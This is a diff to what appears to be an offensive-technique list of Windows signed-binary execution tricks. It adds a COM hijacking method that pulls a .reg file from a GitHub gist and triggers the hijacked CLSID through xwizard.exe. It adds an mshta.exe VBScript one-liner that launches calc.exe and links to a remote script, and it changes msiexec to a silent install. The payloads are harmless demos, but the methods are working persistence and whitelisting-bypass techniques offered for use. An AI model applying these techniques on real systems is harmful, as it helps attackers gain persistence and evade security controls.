@@ -69,10 +69,26 @@ https://gist.githubusercontent.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec/raw
 
 ( 10 ) MSI Launch Execution ( MsiExec.exe ) 
 ```
- msiexec.exe C:\testing.msi 
+ msiexec.exe /passive /i C:\testing.msi /norestart 
  &- File MSI Hello World Exe in .MSI 
-
 ```
+
+( 10v1 ) COM Component object Model Hijacking
+```
+&- Add Reg in System 
+https://gist.githubusercontent.com/homjxi0e/8e42aa716361dc41b1c45a314bea501c/raw/327104671eebad1361210524f34076503e6b8e44/COM-hijacking.reg
+&- You can now Execution invoke-CLSID Via xwizard.exe
+xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+```
+( 10v2 ) Execute VBScript Via mshta.exe
+```
+&- Execute VBScript Code using mshta.exe
+mshta.exe VBScript:Close(Execute("Set S=CreateObject(""WScript.Shell""):If S.AppActivate(""maybe-Run"")=False Then:S.Run(""C:\Windows\system32\Calc.exe""):End If"))
+https://gist.githubusercontent.com/homjxi0e/eb16d75f3db6d6081648f2c5c5c98c3b/raw/0870f7553095dcf6519f93c1cf72c6415468140b/VBSExC
+```
+
+
+
 
 (Note) Product Via @bohops 
 
